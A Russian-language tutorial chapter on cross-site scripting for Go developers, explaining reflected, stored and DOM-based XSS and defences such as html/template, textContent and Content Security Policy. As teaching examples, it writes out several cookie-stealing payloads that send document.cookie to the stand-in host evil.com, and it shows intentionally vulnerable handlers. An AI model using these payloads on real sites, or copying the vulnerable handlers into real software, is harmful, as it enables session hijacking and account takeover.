# 🛡️ Глава 3: Межсайтовый скриптинг (XSS) — Когда браузер становится союзником хакера

## Часть 1: Reflected XSS — атака через один запрос

### 🎯 Конкретный инцидент

Ты написал поиск по своему блогу на Go. Эндпоинт принимает запрос через query string и возвращает HTML-страницу с результатами:

```
GET /search?q=golang
```

Бэкенд возвращает:

```html
<h1>Результаты поиска для: golang</h1>
<p>Найдено 3 статьи...</p>
```

Код в обработчике выглядит так:

```go
func searchHandler(w http.ResponseWriter, r *http.Request) {
    query := r.URL.Query().Get("q")
    tmpl := fmt.Sprintf("<h1>Результаты поиска для: %s</h1>", query)
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    w.Write([]byte(tmpl))
}
```

Я — хакер. Я подготавливаю специальную ссылку:

```
https://your-blog.com/search?q=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

Я отправляю эту ссылку администратору твоего блога через email: «Смотри, твой сайт странно выглядит в поиске, проверь». Администратор кликает. Браузер переходит по ссылке, отправляет запрос на твой сервер. Твой сервер вставляет строку `<script>...</script>` в HTML. Браузер администратора получает ответ, парсит HTML, видит тег `<script>`, выполняет JavaScript.

JavaScript читает `document.cookie` — сессионную куку администратора — и отправляет её на сервер хакера `evil.com`. Теперь у хакера есть сессия администратора. Он заходит в админку, меняет пароль, удаляет данные, делает что угодно.

Это Reflected XSS — атака, которая происходит за один HTTP-запрос. Вредоносный код «отражается» от сервера обратно в браузер жертвы.

*(Cross-Site Scripting (XSS) — клиентская атака, при которой злоумышленник внедряет вредоносный код (обычно JavaScript) в веб-страницу, просматриваемую жертвой. Входит в OWASP Top 10 A03:2021 — Injection. Reflected XSS возникает, когда пользовательский ввод немедленно возвращается сервером в ответе без надлежащего экранирования. Эксплуатирует доверие пользователя к сайту: браузер считает, что скрипт пришёл от легитимного сервера, и выполняет его с полным доступом к DOM и cookies этого сайта.)*

---

### 🧠 Как работает XSS: цепочка рассуждений

**Вопрос 1: Почему браузер выполняет чужой скрипт?**

Браузер не знает, какая часть HTML пришла от разработчика, а какая — от хакера. Он получает готовую HTML-страницу и честно её парсит. Если в HTML есть `<script>`, браузер выполняет его. Это фундаментальное свойство веба.

Есть одна важная деталь, которая отличает XSS от обычного выполнения скриптов. Представь, что ты заходишь на сайт `bank.com` и вводишь логин-пароль. Сайт устанавливает session cookie, и браузер запоминает: «Эта кука принадлежит домену `bank.com`». Теперь при каждом запросе к `bank.com` браузер автоматически прикрепляет эту куку.

Если хакер внедряет скрипт на страницу `bank.com`, этот скрипт выполняется **в контексте домена `bank.com`**. Он имеет доступ к кукам `bank.com`, к localStorage `bank.com`, ко всему DOM-дереву страницы. Браузер думает: «Этот скрипт пришёл от `bank.com`, значит, ему можно доверять». В этом и заключается главная опасность XSS: скрипт хакера получает все привилегии, которые имеет легитимный код сайта.

**Вопрос 2: Что именно может сделать хакер через XSS?**

Возможности ограничены только фантазией и контекстом:

1. **Кража сессии:** `document.cookie` → отправить на сервер хакера. Если кука не имеет флага `HttpOnly`, хакер получает сессию жертвы.

2. **Кейлоггинг:** перехват всех нажатий клавиш на странице. Хакер может украсть пароль, даже если пользователь не отправляет форму.

3. **Фишинговая форма:** внедрить поддельную форму логина поверх реального сайта. Жертва видит знакомый домен в адресной строке и вводит пароль.

4. **Изменение контента:** подменить банковские реквизиты на странице оплаты. Пользователь переводит деньги хакеру, думая, что платит продавцу.

5. **CSRF-атаки:** выполнить запросы от имени жертвы. Если в админке нет защиты от CSRF, XSS может удалять данные, менять настройки, создавать новых админов.

6. **Эксфильтрация данных:** прочитать содержимое страницы и отправить хакеру. Например, список клиентов из админки.

**Вопрос 3: Почему `HttpOnly` на куках так важен при XSS?**

`HttpOnly` — это флаг, который запрещает JavaScript доступ к куке. Кука с `HttpOnly` передаётся браузером автоматически в HTTP-запросах, но `document.cookie` её не видит. Если у сессионной куки стоит `HttpOnly`, хакер не может украсть её через XSS. Он всё ещё может делать запросы от имени жертвы (потому что браузер прикрепит куку автоматически), но не может эксфильтровать саму куку для повторного использования на своей машине.

Это важнейшая защита, но она не панацея. XSS с `HttpOnly` всё ещё позволяет делать любые действия от имени жертвы на этом домене, просто хакер не может «вынести» сессию наружу.

### 🔬 Три типа XSS: отражённый, хранимый и DOM-based

**Reflected XSS (Отражённый)**

Вредоносный код приходит в HTTP-запросе (обычно через query string) и немедленно возвращается сервером в ответе. Требует, чтобы жертва перешла по специально подготовленной ссылке. Пример из начала главы — классический Reflected XSS.

В современных браузерах есть встроенная защита от некоторых Reflected XSS: браузер может отказаться выполнять скрипт, который присутствует в URL и одновременно в теле ответа. Но эта защита работает только для самых простых случаев и не должна быть единственной линией обороны.

**Stored XSS (Хранимый)**

Вредоносный код сохраняется на сервере (в БД, в комментарии, в сообщении) и показывается всем, кто просматривает страницу. Это гораздо опаснее: хакеру не нужно заманивать жертву по ссылке. Достаточно один раз оставить комментарий с XSS, и каждый посетитель страницы будет выполнять вредоносный скрипт. Разберём детально в Части 2.

**DOM-based XSS (Основанный на DOM)**

Вредоносный код вообще не доходит до сервера. Уязвимость — в клиентском JavaScript, который читает параметры из URL или `document.location` и вставляет их в DOM через `innerHTML` или `document.write()`. Сервер не видит атаку, WAF (Web Application Firewall) не видит атаку. Вся эксплуатация происходит в браузере. Разберём детально в Части 3.

### 🛡️ Защита от Reflected XSS в Go: html/template (Blue Team)

Решение — **контекстное экранирование**. Ты должен экранировать пользовательский ввод перед вставкой в HTML, и экранирование должно зависеть от контекста: одно дело — вставить текст внутрь HTML-тега, другое — внутрь атрибута, третье — внутрь JavaScript-блока.

*(Contextual Output Encoding — техника экранирования данных в зависимости от контекста вставки. HTML-контекст: `<` → `&lt;`. JavaScript-контекст: `'` → `\'`. URL-контекст: пробел → `%20`. Правильное контекстное экранирование предотвращает XSS, потому что специальные символы HTML/JS/CSS теряют своё специальное значение и воспринимаются браузером как обычный текст.)*

**Неправильно (конкатенация строк, `text/template`):**

```go
// Так делать НЕЛЬЗЯ
func searchHandler(w http.ResponseWriter, r *http.Request) {
    query := r.URL.Query().Get("q")
    tmpl := fmt.Sprintf("<h1>Результаты поиска для: %s</h1>", query)
    w.Write([]byte(tmpl))
}
```

**Правильно (html/template):**

```go
import "html/template"

var searchTemplate = template.Must(template.New("search").Parse(`
<h1>Результаты поиска для: {{.Query}}</h1>
`))

func searchHandler(w http.ResponseWriter, r *http.Request) {
    query := r.URL.Query().Get("q")
    data := struct{ Query string }{Query: query}
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    searchTemplate.Execute(w, data)
}
```

Если хакер передаст `?q=<script>alert(1)</script>`, `html/template` автоматически превратит это в:

```html
<h1>Результаты поиска для: &lt;script&gt;alert(1)&lt;/script&gt;</h1>
```

Браузер покажет это как текст, а не выполнит как скрипт.

**Почему `html/template`, а не `text/template`?**

`text/template` **не экранирует ничего**. Он просто вставляет строку как есть. Если ты используешь `text/template` для генерации HTML, у тебя XSS. `html/template` знает о структуре HTML, понимает контекст (тело тега, атрибут, скрипт, стиль) и применяет правильное экранирование для каждого контекста автоматически.

Пример контекстного экранирования в `html/template`:

```go
// Шаблон
tmpl := `<a href="{{.URL}}">{{.Label}}</a>`

// Данные
data := struct {
    URL   string
    Label string
}{
    URL:   "javascript:alert(1)",
    Label: "<script>alert(2)</script>",
}

// Результат: <a href="#ZgotmplZ">&lt;script&gt;alert(2)&lt;/script&gt;</a>
```

`html/template` обнаружил, что URL начинается с `javascript:`, и заменил его на безопасный `#ZgotmplZ`. А текст внутри тега экранировал HTML-entities. Разные контексты — разное экранирование, всё автоматически.

---

### 📝 Что мы узнали?
- XSS — это внедрение вредоносного кода (обычно JavaScript) в страницу, которую видит жертва
- Reflected XSS — атака через один запрос, вредоносный код в query string
- Вредоносный скрипт выполняется в контексте легитимного домена и имеет доступ к cookies, localStorage, DOM
- `html/template` в Go автоматически делает контекстное экранирование — это главный рубеж защиты
- `text/template` не экранирует ничего и категорически не подходит для HTML

### 💥 Типичные ошибки
- **Ошибка:** Использовать `text/template` для HTML
    - **Правда:** `text/template` — это генератор plain text. Для HTML есть `html/template`. Разница — наличие XSS или его отсутствие.
- **Ошибка:** Думать, что `json.Marshal` экранирует HTML
    - **Правда:** `json.Marshal` по умолчанию экранирует `<`, `>`, `&` в строках. Но если ты потом вставляешь этот JSON в HTML через `innerHTML` в обход экранирования, это не спасёт.
- **Ошибка:** Использовать `template.HTML` для пользовательского ввода
    - **Правда:** Тип `template.HTML` в Go говорит шаблонизатору: «Это безопасный HTML, не экранируй». Если ты пометил пользовательский ввод как `template.HTML`, ты открыл XSS. Используй `template.HTML` только для проверенного, доверенного HTML.

### 🔁 Для быстрого повторения
- **XSS:** внедрение JavaScript в страницу, выполняется в контексте легитимного домена
- **Reflected XSS:** вредоносный код в запросе, немедленно возвращается в ответе
- **Главная защита:** контекстное экранирование через `html/template`
- **Go:** всегда `html/template` для HTML, никогда `text/template`
- **HttpOnly cookies:** предотвращают кражу сессии через `document.cookie`, но не защищают от других действий через XSS

## Часть 2: Stored XSS — бомба замедленного действия

### 🎯 Конкретный инцидент

Твой блог позволяет оставлять комментарии. Пользователь заполняет форму:

```html
<form method="POST" action="/comment">
    <textarea name="body"></textarea>
    <button>Отправить</button>
</form>
```

Бэкенд сохраняет комментарий в БД:

```go
func commentHandler(w http.ResponseWriter, r *http.Request) {
    body := r.FormValue("body")
    // Сохраняем в БД как есть
    db.Exec("INSERT INTO comments (body) VALUES ($1)", body)
}
```

При просмотре страницы комментарии выводятся из БД:

```go
func showComments(w http.ResponseWriter, r *http.Request) {
    rows, _ := db.Query("SELECT body FROM comments")
    for rows.Next() {
        var body string
        rows.Scan(&body)
        fmt.Fprintf(w, "<div class='comment'>%s</div>", body)
    }
}
```

Я, хакер, оставляю комментарий:

```html
Отличная статья! <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

Этот комментарий сохраняется в БД. Теперь **каждый** посетитель страницы с комментариями получает мой скрипт. Администратор заходит модерировать комментарии — его сессия украдена. Обычный пользователь читает статью — его куки отправлены на `evil.com`.

Это Stored XSS. В отличие от Reflected, жертве не нужно переходить по ссылке. Достаточно просто посетить страницу.

*(Stored XSS (Persistent XSS) — разновидность XSS, при которой вредоносный код сохраняется на сервере (база данных, файловая система, кеш) и отображается пользователям при каждом запросе к заражённой странице. Наиболее опасный тип XSS: один злоумышленник заражает страницу, и все посетители автоматически становятся жертвами. Требует экранирования не только при получении данных, но и при их выводе.)*

---

### 🧠 Почему Stored XSS опаснее Reflected

1. **Масштаб:** Reflected XSS требует, чтобы хакер заманил каждую жертву по индивидуальной ссылке. Stored XSS — один раз заразил, жертвами становятся все посетители.

2. **Не требует взаимодействия:** Жертва просто открывает страницу. Никаких кликов по ссылкам, никакого фишинга. Администратор заходит в админку — и уже заражён.

3. **Труднее обнаружить:** Reflected XSS виден в URL (можно заметить подозрительный скрипт). Stored XSS спрятан в БД, URL чистый. Жертва не видит ничего подозрительного.

4. **Self-XSS превращается в массовый:** Если есть уязвимость в поле «имя пользователя», которое видит только сам пользователь — это Self-XSS, кажется безобидным. Но если админ видит список пользователей в админке, Self-XSS становится Stored XSS для администратора.

---

### 🛡️ Защита: экранирование при выводе

Ключевой принцип: **экранируй при выводе, а не при вводе.** Данные должны храниться в БД в исходном виде. Экранирование применяется в момент вставки в HTML.

```go
import "html/template"

func showComments(w http.ResponseWriter, r *http.Request) {
    rows, _ := db.Query("SELECT body FROM comments")
    for rows.Next() {
        var body string
        rows.Scan(&body)
        // Экранируем при выводе
        escaped := template.HTMLEscapeString(body)
        fmt.Fprintf(w, "<div class='comment'>%s</div>", escaped)
    }
}
```

Или, что ещё лучше, используй `html/template` для всего шаблона:

```go
var commentTemplate = template.Must(template.New("comments").Parse(`
{{range .Comments}}
<div class="comment">{{.Body}}</div>
{{end}}
`))
```

---

### 📝 Что мы узнали?
- Stored XSS сохраняется на сервере и атакует всех посетителей страницы
- Опаснее Reflected XSS: масштаб, отсутствие взаимодействия, труднее обнаружить
- Защита: экранирование при выводе, хранение данных в исходном виде

### 🔁 Для быстрого повторения
- **Stored XSS:** вредоносный код в БД, показывается всем посетителям
- **Защита:** `html/template` при выводе, не при вводе
- **Данные храним сырыми,** экранируем в момент отображения

## Часть 3: DOM-based XSS — когда сервер ни при чём

### 🎯 Конкретный инцидент

Твой фронтенд на JavaScript читает параметр из URL и вставляет его в DOM. Код на клиенте:

```javascript
// Получаем параметр ?name= из URL
const params = new URLSearchParams(location.search);
const name = params.get('name');
// Вставляем в DOM
document.getElementById('greeting').innerHTML = 'Привет, ' + name + '!';
```

Сервер вообще не участвует. HTML-страница статическая, сервер отдаёт один и тот же файл.

Я, хакер, отправляю жертве ссылку:

```
https://your-site.com/welcome?name=<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

Жертва переходит по ссылке. Сервер отдаёт статический HTML. Браузер выполняет JavaScript на странице. JavaScript читает `?name=` из URL, вставляет в `innerHTML`. Браузер парсит вставленный HTML, видит тег `<img>` с ошибкой, выполняет `onerror`. Куки отправлены хакеру.

Сервер не видел атаку. WAF не видел атаку (вредоносный код в URL-фрагменте после `#` вообще не отправляется на сервер). Это DOM-based XSS.

*(DOM-based XSS — разновидность XSS, при которой уязвимость находится в клиентском JavaScript-коде. Вредоносные данные никогда не покидают браузер: они приходят из источника, контролируемого злоумышленником (URL, document.referrer, postMessage), и вставляются в DOM через опасные методы (innerHTML, document.write, eval). Сервер не видит атаку, поэтому серверное экранирование и WAF неэффективны. Защита — на стороне клиента: безопасные DOM-методы и Content Security Policy.)*

---

### 🧠 Опасные источники и опасные приёмники в DOM-based XSS

**Опасные источники (sources)** — места, откуда JavaScript читает данные, контролируемые хакером:

- `location.search` — query string параметры
- `location.hash` — фрагмент после `#` (не отправляется на сервер!)
- `document.referrer` — откуда пришёл пользователь
- `postMessage` — сообщения из других окон/iframes
- `localStorage` / `sessionStorage` — если хакер может туда записать (через другой XSS)

**Опасные приёмники (sinks)** — методы, которые превращают строку в исполняемый код или HTML:

- `innerHTML` — парсит строку как HTML
- `document.write()` — пишет HTML в документ
- `eval()` — выполняет строку как JavaScript
- `setTimeout('alert(1)', 100)` — строковый аргумент выполняется как код
- `new Function('...')` — создаёт функцию из строки
- `location.href = userInput` — если `userInput = 'javascript:alert(1)'`

---

### 🛡️ Защита от DOM-based XSS

**Безопасные альтернативы `innerHTML`:**

```javascript
// ❌ Опасно
document.getElementById('greeting').innerHTML = 'Привет, ' + name;

// ✅ Безопасно — вставка как текст
document.getElementById('greeting').textContent = 'Привет, ' + name;

// ✅ Безопасно — создание элемента через DOM API
const span = document.createElement('span');
span.textContent = 'Привет, ' + name;
document.getElementById('greeting').appendChild(span);
```

**Content Security Policy (CSP)**

CSP — это HTTP-заголовок, который говорит браузеру: «Выполняй только те скрипты, которые удовлетворяют этим правилам». Это вторая линия обороны. Если экранирование где-то пропустило XSS, CSP может предотвратить выполнение вредоносного скрипта.

```http
Content-Security-Policy: script-src 'self'; object-src 'none'; base-uri 'self';
```

Этот заголовок означает:
- `script-src 'self'` — выполнять скрипты только с моего домена, никаких инлайн-скриптов (`<script>alert(1)</script>` — заблокирован)
- `object-src 'none'` — запретить `<object>`, `<embed>` (векторы для Flash-атак)
- `base-uri 'self'` — запретить `<base href="...">` (может украсть относительные URL)

CSP не защищает от XSS напрямую, но ограничивает возможности хакера даже при успешной инъекции. С CSP инлайн-скрипт не выполнится. Хакеру придётся найти способ загрузить вредоносный код с разрешённого домена.

---

### 📝 Что мы узнали?
- DOM-based XSS происходит полностью в браузере, сервер не видит атаку
- Опасные источники: `location.search`, `location.hash`, `document.referrer`, `postMessage`
- Опасные приёмники: `innerHTML`, `document.write`, `eval`, `setTimeout` со строкой
- Защита: `textContent` вместо `innerHTML`, DOM API, CSP

### 🔁 Для быстрого повторения
- **DOM-based XSS:** уязвимость в клиентском JS, сервер не участвует
- **Опасные методы:** `innerHTML`, `document.write`, `eval`
- **Безопасные альтернативы:** `textContent`, `createElement` + `appendChild`
- **CSP:** `script-src 'self'` блокирует инлайн-скрипты как вторая линия обороны

## Часть 4: Content Security Policy — вторая линия обороны

### 🎯 Конкретный инцидент

Ты всё сделал правильно: используешь `html/template`, экранируешь вывод. Но в твоём проекте есть ещё фронтенд-команда, которая пишет JavaScript. Они могут допустить DOM-based XSS. Или ты подключаешь сторонний сервис (аналитику, чат, рекламу), который загружает свой JavaScript на твой сайт. Ты не контролируешь их код. Что, если сторонний сервис скомпрометирован и распространяет вредоносный скрипт?

CSP — это твой последний рубеж. Ты говоришь браузеру: «Вот белый список источников, откуда можно загружать скрипты, стили, картинки, шрифты. Всё остальное — блокируй».

---

### 🧠 Как CSP предотвращает выполнение вредоносного кода

**Без CSP — что видит браузер:**

```html
<script>
alert('XSS')  // Инлайн-скрипт? Выполняю!
</script>
<script src="https://evil.com/steal.js"></script>  // Сторонний домен? Загружаю и выполняю!
```

**С CSP `script-src 'self'` — что видит браузер:**

```html
<script>
alert('XSS')  // Инлайн-скрипт? Заблокирован! CSP говорит: только файлы с 'self'.
</script>
<script src="https://evil.com/steal.js"></script>  // Сторонний домен? Заблокирован!
<script src="/static/app.js"></script>  // Свой домен? Разрешён, выполняю.
```

---

### 🛠️ Настройка CSP в Go

```go
func securityHeadersMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        csp := "default-src 'self'; " +
            "script-src 'self'; " +
            "style-src 'self' 'unsafe-inline'; " +
            "img-src 'self' data: https:; " +
            "font-src 'self'; " +
            "object-src 'none'; " +
            "base-uri 'self'; " +
            "frame-ancestors 'none';"
        w.Header().Set("Content-Security-Policy", csp)
        next.ServeHTTP(w, r)
    })
}
```

Разбор директив:
- `default-src 'self'` — по умолчанию всё только с моего домена
- `script-src 'self'` — скрипты только с моего домена, инлайн запрещён
- `style-src 'self' 'unsafe-inline'` — стили с моего домена + разрешить инлайн-стили (часто нужно для UI-фреймворков)
- `img-src 'self' data: https:` — картинки с моего домена, data: URL, и любые HTTPS
- `object-src 'none'` — полностью запретить плагины (Flash, Java)
- `frame-ancestors 'none'` — запретить встраивать сайт в iframe (защита от clickjacking)

---

### 📝 Что мы узнали?
- CSP — это HTTP-заголовок, который ограничивает источники скриптов, стилей и других ресурсов
- Работает как вторая линия обороны: если XSS прошёл, CSP может предотвратить выполнение скрипта
- `script-src 'self'` блокирует инлайн-скрипты и скрипты с чужих доменов
- CSP не заменяет экранирование, а дополняет его

### 🔁 Для быстрого повторения
- **CSP:** HTTP-заголовок `Content-Security-Policy`
- **Ключевая директива:** `script-src 'self'` — блокирует инлайн-скрипты
- **Defence in depth:** экранирование + CSP + HttpOnly cookies

### ✅ Ответы на вопросы для самопроверки

1.  **Reflected XSS:** вредоносный код приходит в запросе и немедленно возвращается в ответе. Требует, чтобы жертва перешла по ссылке. Наибольшая опасность — в целевых фишинговых атаках. **Stored XSS:** код сохраняется на сервере и показывается всем посетителям. Не требует перехода по ссылке. Наибольшая опасность — массовое поражение всех пользователей страницы.

2.  Механизм: (1) Хакер внедряет `<script>` на страницу через XSS. (2) Браузер жертвы парсит HTML, видит тег `<script>`, выполняет JavaScript. (3) Скрипт читает `document.cookie` — сессионную куку жертвы. (4) Скрипт отправляет куку на сервер хакера через `fetch('https://evil.com/steal?cookie=' + document.cookie)`. (5) Хакер получает сессионную куку, устанавливает её в своём браузере, заходит на сайт от имени жертвы.

3.  CSP `script-src 'self'` блокирует инлайн-скрипты (и `<script>alert(1)</script>`, и обработчики событий вроде `onclick="..."`, и `javascript:` URL). При `'unsafe-eval'` разрешён `eval()`, что позволяет обойти CSP: хакер может внедрить скрипт, который загружает полезную нагрузку через `eval()`.

4.  Если `<` и `>` экранируются, хакер не может создать новый HTML-тег. Но он может внедриться в существующий тег через атрибуты. Например, если вывод происходит внутри `<input value="user_input">`, и кавычки не экранированы, хакер вводит: `" onfocus="fetch('https://evil.com/steal?cookie='+document.cookie)" autofocus="`. Это закрывает атрибут `value`, добавляет обработчик `onfocus`, который срабатывает автоматически.

5.  **Серверные XSS (Reflected/Stored):** вредоносный код приходит на сервер, сервер возвращает его в ответе. WAF может анализировать трафик и блокировать подозрительные паттерны. **DOM-based XSS:** вредоносный код не покидает браузер. JavaScript читает его из `location.hash` или `location.search` и вставляет в DOM. Сервер не видит атаку, WAF не видит атаку (особенно если код в `#` фрагменте, который вообще не отправляется на сервер).

6.  **На уровне кода (Go):** (1) Всегда использовать `html/template` для генерации HTML, никогда `text/template`. (2) Экранировать данные при выводе в правильном контексте (HTML, атрибут, JavaScript, URL). (3) Не использовать `template.HTML` для пользовательского ввода. **На уровне инфраструктуры:** (1) CSP-заголовок с `script-src 'self'` для блокировки инлайн-скриптов. (2) HttpOnly флаг на сессионных куках для предотвращения кражи через `document.cookie`. (3) WAF для фильтрации известных XSS-паттернов (не защищает от DOM-based XSS).

7.  `HttpOnly` предотвращает доступ к куке через `document.cookie`. Хакер не может украсть сессию для повторного использования на своей машине. Но XSS всё ещё позволяет: (1) делать любые запросы от имени жертвы (браузер автоматически прикрепит HttpOnly-куку), (2) читать и изменять содержимое страницы, (3) кейлоггинг, (4) внедрять фишинговые формы. `HttpOnly` — важный слой защиты, но не достаточный.

8.  `text/template` не экранирует HTML. Пример:
    ```go
    tmpl, _ := template.New("test").Parse("<h1>{{.}}</h1>")
    tmpl.Execute(os.Stdout, "<script>alert(1)</script>")
    // Вывод: <h1><script>alert(1)</script></h1>
    ```
    Браузер выполнит скрипт. С `html/template`:
    ```go
    tmpl, _ := template.New("test").Parse("<h1>{{.}}</h1>")
    tmpl.Execute(os.Stdout, "<script>alert(1)</script>")
    // Вывод: <h1>&lt;script&gt;alert(1)&lt;/script&gt;</h1>
    ```
    Браузер покажет текст, скрипт не выполнится.

9.  Self-XSS — это XSS, который видит только сам пользователь (например, в поле «имя профиля», которое показывается только ему). Но если администратор может просматривать профили пользователей в админке, Self-XSS становится Stored XSS для администратора. Хакер создаёт аккаунт с XSS в имени, администратор заходит в админку посмотреть на нового пользователя — и выполняется вредоносный скрипт с привилегиями администратора.

10. Обновить CSP: `script-src 'self' https://www.google-analytics.com;`. Это разрешит скрипты с моего домена и конкретно с `google-analytics.com`, но не с других доменов. Нельзя использовать `script-src 'self' https:` — это разрешит ЛЮБЫЕ скрипты по HTTPS с любых доменов, включая домен хакера.
